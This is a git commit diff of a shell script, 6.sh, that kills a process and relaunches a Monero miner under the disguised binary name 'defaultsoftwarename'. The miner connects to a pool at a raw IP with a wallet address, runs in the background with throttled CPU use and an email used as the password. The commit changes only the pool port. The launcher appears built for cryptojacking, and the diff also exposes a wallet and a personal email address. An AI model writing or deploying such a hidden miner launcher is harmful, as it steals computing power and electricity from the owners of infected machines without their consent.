5a111e576530ac3ec153e58c736fd3cda0e5bc43
xylitolz <57494375+xylitolz@users.noreply.github.com>
2019-11-07 21:57:22 +0100

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 23.227.194.41:23281 -u 48PgbkxR7qYGc5Na2HVEGTEX2YuHd3E1wGFTirgBc15tdRvLEEpnC24PiJb3B1j56gVkgQu1TmSDH8AthBinCgEc4mwhuHG --pass=x:GiannaHoranjhb@gmail.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1 --variant -1
+defaultsoftwarename -o 23.227.194.41:43281 -u 48PgbkxR7qYGc5Na2HVEGTEX2YuHd3E1wGFTirgBc15tdRvLEEpnC24PiJb3B1j56gVkgQu1TmSDH8AthBinCgEc4mwhuHG --pass=x:GiannaHoranjhb@gmail.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1 --variant -1
